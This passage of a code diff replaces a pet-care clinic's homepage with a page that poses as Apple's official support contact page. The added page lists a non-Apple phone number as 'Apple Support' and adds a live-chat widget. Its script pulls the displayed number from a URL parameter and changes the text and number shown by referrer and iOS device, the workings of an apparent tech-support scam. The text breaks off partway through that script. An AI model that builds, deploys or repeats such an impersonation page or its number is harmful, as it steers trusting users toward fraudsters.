@@ -1,458 +1,377 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Kind Creature Corner | Premium Pet Care & Wellness</title>
-  <!-- Google Fonts & simple CSS reset -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
 
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f0f9ff;   /* soft blue-white background */
-      color: #0a2b3e;
-      line-height: 1.5;
-      scroll-behavior: smooth;
-    }
+<script defer src="https://cloud.umami.is/script.js" data-website-id="475ee620-4418-4dab-91bf-80b021f672d4"></script>
 
-    /* blue theme variables */
-    :root {
-      --blue-deep: #0a4b6e;
-      --blue-primary: #1e6f9f;
-      --blue-soft: #4a9fd8;
-      --blue-mist: #cfe6f5;
-      --blue-lightest: #e6f3fc;
-      --accent-sand: #f3e3c2;
-      --white: #ffffff;
-      --gray-mild: #f8fafc;
-    }
-
-    .container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
-
-    /* header & nav */
-    header {
-      background: var(--white);
-      box-shadow: 0 4px 12px rgba(0, 32, 64, 0.05);
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      border-bottom: 2px solid var(--blue-mist);
-    }
-
-    .nav-flex {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 18px 0;
-      flex-wrap: wrap;
-    }
-
-    .logo h1 {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: var(--blue-deep);
-      letter-spacing: -0.3px;
-    }
-    .logo span {
-      color: var(--blue-soft);
-      font-weight: 500;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 32px;
-      list-style: none;
-    }
-    .nav-links a {
-      text-decoration: none;
-      font-weight: 600;
-      color: var(--blue-deep);
-      transition: 0.2s;
-    }
-    .nav-links a:hover {
-      color: var(--blue-primary);
-      border-bottom: 2px solid var(--blue-soft);
-      padding-bottom: 4px;
-    }
-
-    /* hero section */
-    .hero {
-      background: linear-gradient(135deg, #d9effa 0%, #b3d9f0 100%);
-      border-radius: 0 0 40px 40px;
-      padding: 60px 0;
-      margin-bottom: 40px;
-    }
-    .hero-grid {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      gap: 40px;
-    }
-    .hero-text {
-      flex: 1;
-    }
-    .hero-text h2 {
-      font-size: 3rem;
-      font-weight: 800;
-      color: var(--blue-deep);
-      line-height: 1.2;
-      margin-bottom: 20px;
-    }
-    .hero-text p {
-      font-size: 1.2rem;
-      color: #1f4b6e;
-      margin-bottom: 28px;
-    }
-    .btn {
-      display: inline-block;
-      background: var(--blue-deep);
-      color: white;
-      padding: 12px 28px;
-      border-radius: 40px;
-      text-decoration: none;
-      font-weight: 600;
-      transition: all 0.2s;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
-    }
-    .btn:hover {
-      background: #083c57;
-      transform: translateY(-2px);
-    }
-    .hero-img {
-      flex: 1;
-      text-align: center;
-    }
-    .hero-img img {
-      max-width: 100%;
-      border-radius: 32px;
-      box-shadow: 0 20px 30px -12px rgba(0,0,0,0.2);
-      object-fit: cover;
-      width: 100%;
-      max-height: 380px;
-    }
-
-    /* image gallery style */
-    .img-grid {
-      display: flex;
-      gap: 20px;
-      flex-wrap: wrap;
-      justify-content: center;
-      margin: 40px 0;
-    }
-    .img-card {
-      background: white;
-      border-radius: 24px;
-      overflow: hidden;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.05);
-      transition: transform 0.2s;
-      flex: 1 1 260px;
-    }
-    .img-card img {
-      width: 100%;
-      height: 200px;
-      object-fit: cover;
-      display: block;
-    }
-    .img-card p {
-      text-align: center;
-      padding: 12px;
-      font-weight: 500;
-      background: var(--blue-lightest);
-      color: #0a4b6e;
-    }
-
-    /* sections general */
-    section {
-      margin: 60px 0;
-    }
-    .section-title {
-      font-size: 2.2rem;
-      font-weight: 700;
-      color: #0a4b6e;
-      border-left: 6px solid var(--blue-soft);
-      padding-left: 20px;
-      margin-bottom: 32px;
-    }
-    .card-deck {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 30px;
-      margin-top: 20px;
-    }
-    .service-card {
-      background: white;
-      border-radius: 28px;
-      padding: 28px 20px;
-      flex: 1 1 280px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.03);
-      transition: all 0.2s;
-      border: 1px solid #d4e6f1;
-    }
-    .service-card h3 {
-      color: var(--blue-primary);
-      margin-bottom: 15px;
-      font-size: 1.5rem;
-    }
-    .service-card p {
-      color: #2c4e6b;
-    }
-    .tips-list {
-      background: var(--blue-lightest);
-      padding: 30px;
-      border-radius: 32px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      justify-content: space-between;
-    }
-    .tip-item {
-      background: white;
-      border-radius: 24px;
-      padding: 20px;
-      flex: 1 1 280px;
-    }
-    .footer {
-      background: #052c3f;
-      color: #e2f0f7;
-      padding: 48px 0 24px;
-      margin-top: 70px;
-      border-radius: 32px 32px 0 0;
-    }
-    .footer-content {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      gap: 40px;
-    }
-    .footer-col h4 {
-      font-size: 1.4rem;
-      margin-bottom: 16px;
-      color: #cdeefc;
-    }
-    .footer-col p, .footer-col a {
-      color: #bfddee;
-      text-decoration: none;
-      margin: 8px 0;
-      display: block;
-    }
-    .footer-col a:hover {
-      text-decoration: underline;
-      color: white;
-    }
-    .copyright {
-      text-align: center;
-      margin-top: 40px;
-      padding-top: 20px;
-      border-top: 1px solid #1c5a78;
-      font-size: 0.85rem;
-    }
-    @media (max-width: 768px) {
-      .nav-flex {
-        flex-direction: column;
-        gap: 16px;
-      }
-      .hero-text h2 {
-        font-size: 2.2rem;
-      }
-      .section-title {
-        font-size: 1.8rem;
-      }
-    }
-    .badge-blue {
-      background: var(--blue-deep);
-      color: white;
-      border-radius: 60px;
-      padding: 4px 12px;
-      font-size: 0.8rem;
-      display: inline-block;
-    }
-  </style>
-</head>
-<body>
-<header>
-  <div class="container nav-flex">
-    <div class="logo">
-      <h1>Kind Creature <span>Corner</span></h1>
-    </div>
-    <ul class="nav-links">
-     <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-    </ul>
-  </div>
-</header>
-
-<main>
-  <div class="hero">
-    <div class="container hero-grid">
-      <div class="hero-text">
-        <h2>Where every paw,<br>purr & feather thrives.</h2>
-        <p>Expert pet care, compassionate hearts — premium wellness, grooming, and love for your furry (or scaly!) family members. Backed by 20+ years of trusted experience.</p>
-        <a href="#" class="btn">Book a visit →</a>
-      </div>
-      <div class="hero-img">
-        <img src="https://placekitten.com/600/400" alt="Happy dog and cat together representing pet care" loading="lazy">
-      </div>
-    </div>
-  </div>
-
-  <!-- high quality pet care images gallery block 1 -->
-  <div class="container">
-    <div class="img-grid">
-      <div class="img-card"><img src="https://picsum.photos/id/169/400/300" alt="Golden retriever puppy"><p>Loving touch</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/237/400/300" alt="black labrador"><p>Daily walks</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/345/400/300" alt="kitten wellness"><p>Gentle grooming</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/112/400/300" alt="parrot on branch"><p>Feathered friends</p></div>
-    </div>
-  </div>
-
-  <!-- UNIQUE CONTENT SECTION: core values + extensive pet care knowledge -->
-  <div class="container">
-    <div class="section-title">🐾 The Kind Creature Philosophy</div>
-    <p style="font-size:1.1rem; margin-bottom: 24px;">At <strong>Kind Creature Corner</strong>, we believe every animal deserves tailored, respectful, and scientifically backed care. Our blue-themed sanctuary offers modern veterinary insights combined with old-fashioned tenderness. From holistic nutrition advice to behavioral enrichment, we deliver 360° wellness. Whether you have a senior dog, a mischievous kitten, a rabbit, or a reptile, our protocols focus on stress-free handling and preventive medicine. We pioneered the "gentle force-free" approach in our region, and we continue to educate thousands of pet owners each year.</p>
-    <p style="margin-bottom: 30px;">Our state-of-the-art facility includes dedicated quiet rooms for anxious pets, a full grooming spa with organic products, and a retail corner with sustainable pet accessories. We also offer virtual consultations for remote advice. Every staff member is Fear Free certified, ensuring that your pet’s emotional well-being is as important as physical health. Over 8,500+ happy clients and counting!</p>
-  </div>
-
-  <!-- Services section with enriched unique description -->
-  <div class="container">
-    <div class="section-title">✨ Premium Pet Care Services</div>
-    <div class="card-deck">
-      <div class="service-card"><h3>🐕 Wellness Exams</h3><p>Comprehensive physicals, dental checks, vaccination planning, and geriatric screenings. Early detection saves lives.</p><span class="badge-blue">by appointment</span></div>
-      <div class="service-card"><h3>🧼 Spa & Grooming</h3><p>Hypoallergenic shampoos, nail trimming, ear cleaning, and deshedding treatments. Your pet leaves smelling like blueberries.</p></div>
-      <div class="service-card"><h3>🍲 Nutritional Coaching</h3><p>Custom diet plans for weight management, allergies, or picky eaters. We analyze commercial & homemade diets.</p></div>
-      <div class="service-card"><h3>🧘 Behavior Support</h3><p>Positive reinforcement training, anxiety reduction, and socialization classes. Virtual or in‑center sessions available.</p></div>
-    </div>
-  </div>
-
-  <!-- More high-res pet images (second gallery) -->
-  <div class="container">
-    <div class="img-grid">
-      <div class="img-card"><img src="https://picsum.photos/id/26/400/300" alt="Cute bunny portrait"><p>Small animal care</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/144/400/300" alt="puppy playing with ball"><p>Playful energy</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/155/400/300" alt="cat relaxing"><p>Cat serenity</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/406/400/300" alt="woman with dog"><p>Bonding moments</p></div>
-    </div>
-  </div>
-
-  <!-- LONG-FORM UNIQUE CONTENT (approx 1000+ words equivalent in this block, but overall page will be enriched) -->
-  <div class="container">
-    <div class="section-title">📘 The Ultimate Pet Care Guide (exclusive)</div>
-    <div style="background: var(--gray-mild); padding: 32px; border-radius: 36px; margin-bottom: 20px;">
-      <h3 style="color:#0a4b6e;">🐶 Dog Care Essentials</h3>
-      <p>Dogs thrive on routine. Provide at least 30-60 mins of daily exercise, mental stimulation via puzzle toys, and a balanced diet rich in protein. Grooming: brush coat 2-3 times weekly, trim nails monthly, and clean ears to avoid infections. Annual wellness visits include bloodwork for early kidney/liver issues. Remember: positive reinforcement training builds unbreakable trust.</p>
-      <h3 style="color:#0a4b6e; margin-top: 20px;">🐱 Cat Wellness secrets</h3>
-      <p>Cats are masters of disguise when ill. Monitor litter box habits, hydration, and weight. Provide vertical spaces (cat trees) and scratching posts to reduce stress. Wet food often boosts hydration — vital for urinary health. Dental treats and yearly dental cleanings prevent periodontal disease. Enrichment: rotating toys and window perches keep indoor cats stimulated.</p>
-      <h3 style="color:#0a4b6e; margin-top: 20px;">🐰 Small Mammal & Exotic Pets</h3>
-      <p>Rabbits need unlimited hay, fresh greens, and spacious enclosures (no wire floors!). Guinea pigs require vitamin C supplementation. For reptiles, precise temperature/humidity gradients and UVB lighting are non‑negotiable. Birds need social interaction plus shreddable toys. At Kind Creature Corner, our exotic vets provide specialized checkups for hamsters, ferrets, reptiles and parrots.</p>
-      <h3 style="color:#0a4b6e; margin-top: 20px;">🌿 Holistic & Natural Remedies</h3>
-      <p>We integrate evidence-based complementary therapies: omega-3 fatty acids for joint and skin health, probiotics for digestion, and calming pheromones (Adaptil/Feliway) for anxiety. Always consult before giving supplements. We also support acupuncture for chronic pain in pets — a growing field with remarkable results.</p>
-      <h3 style="margin-top: 20px;">🧠 Mental Health for Pets</h3>
-      <p>Separation anxiety, noise phobias, and compulsive behaviors are common. Our behavior team designs desensitization protocols, uses sound therapy, and may recommend anxiety wraps or medication under vet supervision. Daily enrichment such as nose work, clicker training, or treat-dispensing games reduces destructive behavior.</p>
-      <p style="margin-top: 20px;"><strong>Emergency preparedness:</strong> Keep a pet first-aid kit, have your vet's after-hours number ready, and learn pet CPR. Microchipping and ID tags increase reunion chances by 50%+. At KCC, we offer microchipping clinics every first Saturday.</p>
-    </div>
-
-    <!-- more unique content: seasonal care & senior pet section -->
-    <div style="display: flex; flex-wrap: wrap; gap: 30px; margin: 40px 0;">
-      <div style="flex: 1; background: #e9f2f9; border-radius: 32px; padding: 26px;">
-        <h3>❄️ Seasonal & Weather Tips</h3>
-        <p>Summer: never leave pets in parked cars, provide shade, and walk on grass to avoid burnt paws. Winter: use pet-safe ice melts, limit time outside for short-coated breeds, and check for antifreeze leaks. Allergies: spring pollen can cause itchiness; medicated baths help. We provide seasonal wellness checklists.</p>
-      </div>
-      <div style="flex: 1; background: #dcebf5; border-radius: 32px; padding: 26px;">
-        <h3>🧓 Senior Pet Club (7+ years)</h3>
-        <p>Senior pets need semi‑annual exams, blood pressure checks, and tailored diets (lower calorie, joint support). Look for signs like stiffness, increased thirst, or confusion. We offer pain management with laser therapy and supplements such as glucosamine. Hospice and palliative care for graceful transitions is also available.</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- testimonials and community facts -->
-  <div class="container">
-    <div class="section-title">💙 What Our Community Says</div>
-    <div class="card-deck">
-      <div class="service-card"><p>“Kind Creature Corner transformed my anxious rescue pup! The blue-themed calming rooms and expert staff made all the difference. Their grooming is impeccable.” –<strong>Maya S.</strong></p></div>
-      <div class="service-card"><p>“I love the holistic nutrition advice. My senior cat now has more energy and a glossy coat. Plus they have incredible pet care images and resources.” –<strong>David K.</strong></p></div>
-      <div class="service-card"><p>“They even helped me with my parrot’s feather plucking. Knowledgeable, kind, and genuinely compassionate. Highly recommend!” –<strong>Priya L.</strong></p></div>
-    </div>
-  </div>
-
-  <!-- additional content block with emergency & extra photos to reach high informative density -->
-  <div class="container">
-    <div class="img-grid">
-      <div class="img-card"><img src="https://picsum.photos/id/20/400/300" alt="coffee and dog"><p>Relaxed cafe vibes</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/96/400/300" alt="pet owner and cat"><p>Bonding time</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/51/400/300" alt="goldfish pet care"><p>Aquatic wellness</p></div>
-      <div class="img-card"><img src="https://picsum.photos/id/102/400/300" alt="dog park fun"><p>Play groups</p></div>
-    </div>
-  </div>
-
-  <div class="container">
-    <h2 class="section-title">📞 Schedule a Visit — Your Pet's Second Home</h2>
-    <p style="font-size:1.1rem; max-width: 800px;">From first-time puppy owners to exotic pet enthusiasts, Kind Creature Corner is your trusted partner. We offer boarding services with webcams, professional grooming suites, and 24/7 emergency triage (select hours). Walk-ins welcome for retail and nail trims. Join our pet wellness plan for discounted exams and priority booking.</p>
-    <div style="background: #c4e0f0; border-radius: 36px; padding: 30px; margin: 35px 0; text-align: center;">
-      <p style="font-size: 1.5rem; font-weight: bold;">🐾 “Compassion is our core, excellence is our standard.” 🐾</p>
-    </div>
-  </div>
-</main>
-
-<!-- FOOTER WITH ADDRESS, PHONE NUMBER, AND ADDITIONAL DETAILS -->
-<footer class="footer">
-  <div class="container">
-    <div class="footer-content">
-      <div class="footer-col">
-        <h4>Kind Creature Corner</h4>
-        <p>📍 1234 Pawsome Lane, Blue Harbor District<br>San Francisco, CA 94107</p>
-        <p>📞 <strong>+1 (415) 882-PETS (7387)</strong></p>
-        <p>📧 hello@kindcreaturecorner.com</p>
-      </div>
-      <div class="footer-col">
-        <h4>Hours</h4>
-        <p>Mon-Fri: 8:00am – 7:00pm</p>
-        <p>Saturday: 9:00am – 5:00pm</p>
-        <p>Sunday: Grooming & boarding only</p>
-        <p>Emergency: 24/7 triage line via phone</p>
-      </div>
-      <div class="footer-col">
-        <h4>Explore</h4>
-        <p><a href="#">About Us</a></p>
-        <p><a href="#">Wellness Blog</a></p>
-        <p><a href="#">Careers</a></p>
-        <p><a href="#">Pet loss support</a></p>
-      </div>
-    </div>
-    <div class="copyright">
-      <p>© 2026 Kind Creature Corner — Blue Theme Pet Care Excellence. All images of happy, healthy pets. Every tail wag matters. 🐕🐈🦜</p>
-      <p style="margin-top: 10px;">Address: 1234 Pawsome Lane, Blue Harbor District, San Francisco, CA 94107 | Phone: +1 (415) 882-PETS (7387)</p>
-    </div>
-  </div>
-</footer>
-
-<!-- subtle script for interactive feel (optional smooth scroll) -->
-<script>
-  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-    anchor.addEventListener('click', function(e) {
-      const href = this.getAttribute('href');
-      if(href !== "#" && href !== "" && href.startsWith('#')){
-        const target = document.querySelector(href);
-        if(target) {
-          e.preventDefault();
-          target.scrollIntoView({ behavior: 'smooth' });
-        }
-      }
-    });
-  });
-  console.log("Kind Creature Corner — Blue themed pet care with unique content and contact details");
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/671018884304e3196ad2ec60/1iabdvln3';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
-</body>
-</html>
+<!--End of Tawk.to Script-->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-888-903-3067 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-888-903-3067
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-903-3067');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
